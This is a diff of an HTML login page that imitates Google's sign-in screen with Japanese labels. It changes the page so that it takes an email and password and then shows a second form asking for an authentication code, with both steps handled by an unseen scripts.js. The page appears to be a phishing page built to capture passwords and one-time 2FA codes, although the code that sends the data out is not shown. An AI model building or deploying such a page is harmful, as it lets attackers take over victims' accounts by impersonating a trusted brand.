@@ -14,7 +14,7 @@
         <div class="login-box">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
             <h1>ログイン</h1>
-            <form action="https://google.com" method="post">
+            <form id="login-form">
                 <div class="input-group">
                     <input type="email" id="email" required>
                     <label for="email">メールアドレス</label>
@@ -23,10 +23,18 @@
                     <input type="password" id="password" required>
                     <label for="password">パスワード</label>
                 </div>
-                <button type="submit" class="login-button">ログイン</button>
+                <button type="button" class="login-button" onclick="sendAuthCode()">ログイン</button>
+            </form>
+            <form id="auth-form" style="display: none;">
+                <div class="input-group">
+                    <input type="text" id="auth-code" required>
+                    <label for="auth-code">認証コード</label>
+                </div>
+                <button type="button" class="login-button" onclick="verifyAuthCode()">認証</button>
             </form>
             <p class="signup-text">アカウントをお持ちでない場合 <a href="https://accounts.google.com/signup">アカウント作成</a></p>
         </div>
     </div>
+    <script src="scripts.js"></script>
 </body>
 </html>
